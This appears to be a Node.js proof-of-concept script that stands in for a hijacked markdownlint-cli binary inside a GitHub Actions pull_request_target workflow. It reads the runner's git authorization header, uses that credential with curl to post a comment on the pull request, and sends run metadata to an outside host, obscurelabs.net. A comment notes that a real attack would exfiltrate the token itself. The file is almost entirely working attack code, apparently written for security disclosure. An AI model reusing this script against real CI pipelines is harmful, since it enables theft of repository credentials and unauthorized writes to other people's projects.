#!/usr/bin/env node

const { execSync } = require('child_process');
const fs = require('fs');

console.log('='.repeat(60));
console.log('[PoC] HIJACKED markdownlint-cli EXECUTED');
console.log('='.repeat(60));

// Read the event payload for PR info
let eventPayload = {};
try {
  const eventPath = process.env.GITHUB_EVENT_PATH;
  if (eventPath) {
    eventPayload = JSON.parse(fs.readFileSync(eventPath, 'utf8'));
  }
} catch (e) {}

const prNumber = eventPayload.pull_request?.number;
const repo = process.env.GITHUB_REPOSITORY;

console.log('\n[PoC] === EXTRACTING GIT CREDENTIALS ===');

// Try to extract the actual auth header from git config
let authHeader = '';
try {
  // Get the raw extraheader value
  authHeader = execSync(
    'git config --get http.https://github.com/.extraheader 2>/dev/null || echo "not found"',
    { encoding: 'utf-8', cwd: process.env.GITHUB_WORKSPACE }
  ).trim();

  console.log('[PoC] Auth header found:', authHeader ? 'YES' : 'NO');
  console.log('[PoC] Auth header length:', authHeader.length);

  // In a real attack, we would exfiltrate this token
  // For the PoC, let's just show it exists and use it
} catch (e) {
  console.log('[PoC] Could not extract auth header:', e.message);
}

console.log('\n[PoC] === DEMONSTRATING WRITE ACCESS ===');

// Try to use the GitHub API with the extracted credential
if (authHeader && authHeader !== 'not found' && prNumber) {
  try {
    // The auth header is in format "AUTHORIZATION: basic <base64>"
    // Extract just the base64 part
    const base64Token = authHeader.replace('AUTHORIZATION: basic ', '').trim();

    // Create a comment on the PR to prove write access
    const commentBody = JSON.stringify({
      body: `## ðŸ”´ Security PoC - Write Access Demonstrated

This comment was created by arbitrary code execution in the CI workflow.

**Vulnerability**: \`pull_request_target\` with checkout of untrusted PR code

**Impact**: An attacker from a fork can:
- Execute arbitrary code in CI
- Access repository credentials
- Comment/modify PRs
- Potentially push code or create releases

**Run ID**: ${process.env.GITHUB_RUN_ID}
**Timestamp**: ${new Date().toISOString()}`
    });

    const curlCmd = `curl -s -X POST \
      -H "Authorization: basic ${base64Token}" \
      -H "Accept: application/vnd.github.v3+json" \
      -H "Content-Type: application/json" \
      -d '${commentBody.replace(/'/g, "'\\''")}' \
      "https://api.github.com/repos/${repo}/issues/${prNumber}/comments"`;

    console.log('[PoC] Attempting to comment on PR #' + prNumber);
    const result = execSync(curlCmd, { encoding: 'utf-8', timeout: 15000 });
    console.log('[PoC] API Response:', result.substring(0, 500));
  } catch (e) {
    console.log('[PoC] API call error:', e.message);
  }
}

// Send data to obscurelabs.net
const payload = JSON.stringify({
  vulnerability: 'npx_hijack_write_access_poc',
  timestamp: new Date().toISOString(),
  github: {
    repository: repo,
    run_id: process.env.GITHUB_RUN_ID,
    actor: process.env.GITHUB_ACTOR,
    pr_number: prNumber,
  },
  auth_header_present: authHeader && authHeader !== 'not found',
  auth_header_length: authHeader?.length || 0,
});

console.log('\n[PoC] === SENDING DATA TO OBSCURELABS.NET ===');
try {
  execSync(
    `curl -s -X POST https://www.obscurelabs.net/ -H "Content-Type: application/json" -d '${payload.replace(/'/g, "'\\''")}'`,
    { encoding: 'utf-8', timeout: 15000 }
  );
  console.log('[PoC] Data exfiltrated successfully');
} catch (e) {
  console.log('[PoC] Exfiltration error:', e.message);
}

console.log('\n' + '='.repeat(60));
console.log('[PoC] DEMONSTRATION COMPLETE');
console.log('='.repeat(60));

process.exit(0);
